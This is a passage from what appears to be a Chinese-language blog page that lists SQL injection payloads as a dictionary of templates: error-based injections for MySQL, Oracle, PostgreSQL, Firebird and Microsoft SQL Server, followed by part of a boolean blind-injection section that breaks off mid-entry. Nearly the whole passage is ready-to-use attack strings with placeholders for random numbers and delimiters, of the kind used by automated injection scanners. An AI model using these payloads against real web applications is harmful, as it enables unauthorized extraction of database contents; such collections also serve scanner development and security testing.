class="keyword">SELECT</span> [RANDNUM5])a <span class="keyword">GROUP</span> <span class="keyword">BY</span> x))s)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_56':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_57':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_54':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_0':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_1':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_2':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_3':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_4':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_5':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8)))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_6':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_7':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> (<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_8':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">AND</span> EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_9':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> <span class="keyword">OR</span> EXTRACTVALUE([RANDNUM],<span class="keyword">CONCAT</span>(<span class="string">'\\'</span>,<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>)),<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_53':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_49':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span>(<span class="keyword">SELECT</span> <span class="keyword">COUNT</span>(*),<span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="keyword">FLOOR</span>(<span class="keyword">RAND</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">FROM</span> INFORMATION_SCHEMA.PLUGINS <span class="keyword">GROUP</span> <span class="keyword">BY</span> x)a)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_48':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> JSON_KEYS((<span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>((<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>)) <span class="keyword">USING</span> utf8))))x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_45':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Firebird', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> [RANDNUM]=(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="keyword">CASE</span> [RANDNUM] <span class="keyword">WHEN</span> [RANDNUM] <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span> <span class="keyword">FROM</span> RDB$<span class="keyword">DATABASE</span>)||<span class="string">'[DELIMITER_STOP]'</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_44':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Oracle', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> <span class="keyword">UPPER</span>(<span class="keyword">XMLType</span>(<span class="keyword">CHR</span>(<span class="number">60</span>)||<span class="keyword">CHR</span>(<span class="number">58</span>)||<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">FROM</span> DUAL)||<span class="string">'[DELIMITER_STOP]'</span>||<span class="keyword">CHR</span>(<span class="number">62</span>))) <span class="keyword">FROM</span> DUAL)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_47':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">EXP</span>(~(<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))x)))s)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_46':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'MySQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> ,(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">2</span>*(<span class="keyword">IF</span>((<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="keyword">CONCAT</span>(<span class="string">'[DELIMITER_START]'</span>,(<span class="keyword">SELECT</span> (<span class="keyword">ELT</span>([RANDNUM]=[RANDNUM],<span class="number">1</span>))),<span class="string">'[DELIMITER_STOP]'</span>,<span class="string">'x'</span>))s), <span class="number">8446744073709551610</span>, <span class="number">8446744073709551610</span>)))x)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_41':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> <span class="number">1</span> <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_40':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'PostgreSQL', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">CAST</span>(<span class="string">'[DELIMITER_START]'</span>||(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>))::<span class="built_in">text</span>||<span class="string">'[DELIMITER_STOP]'</span> <span class="keyword">AS</span> <span class="built_in">NUMERIC</span>))<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_43':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>)<span class="string">"&#125;,</span></span><br><span class="line"><span class="string">    'INJPAY_42':</span></span><br><span class="line"><span class="string">        &#123;'dbms': 'Microsoft SQL Server', 'grep': '[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]',</span></span><br><span class="line"><span class="string">         'payload': "</span> (<span class="keyword">CONVERT</span>(<span class="built_in">INT</span>,(<span class="keyword">SELECT</span> <span class="string">'[DELIMITER_START]'</span>+(<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="string">'1'</span> <span class="keyword">ELSE</span> <span class="string">'0'</span> <span class="keyword">END</span>))+<span class="string">'[DELIMITER_STOP]'</span>)))<span class="string">"&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<h4 id="2-2-盲注payload"><a href="#2-2-盲注payload" class="headerlink" title="2.2  盲注payload"></a>2.2  盲注payload</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line">bool_blind_injection = &#123;</span><br><span class="line"></span><br><span class="line">    "INJPAY_27":</span><br><span class="line">        &#123;</span><br><span class="line">            'comparsion': ' and (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>Microsoft <span class="keyword">SQL</span> <span class="keyword">Server</span><span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> (<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> [RANDNUM] <span class="keyword">ELSE</span> [RANDNUM]*(<span class="keyword">SELECT</span> [RANDNUM] <span class="keyword">UNION</span> <span class="keyword">ALL</span> <span class="keyword">SELECT</span> [RANDNUM1]) <span class="keyword">END</span>))<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_26":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> [ORIGVALUE] <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>payload<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> [ORIGVALUE] <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span><span class="keyword">level</span><span class="string">': '</span><span class="number">3</span><span class="string">'&#125;,</span></span><br><span class="line"><span class="string">    "INJPAY_25":</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">            '</span>comparsion<span class="string">': '</span> <span class="keyword">and</span> (<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> GENERATE_SERIES([RANDNUM],[RANDNUM],<span class="keyword">CASE</span> <span class="keyword">WHEN</span> ([RANDNUM]=[RANDNUM1]) <span class="keyword">THEN</span> <span class="number">1</span> <span class="keyword">ELSE</span> <span class="number">0</span> <span class="keyword">END</span>) <span class="keyword">LIMIT</span> <span class="number">1</span>)<span class="string">',</span></span><br><span class="line"><span class="string">            '</span>dbms<span class="string">': '</span>PostgreSQL<span class="string">',</span></span><br><span 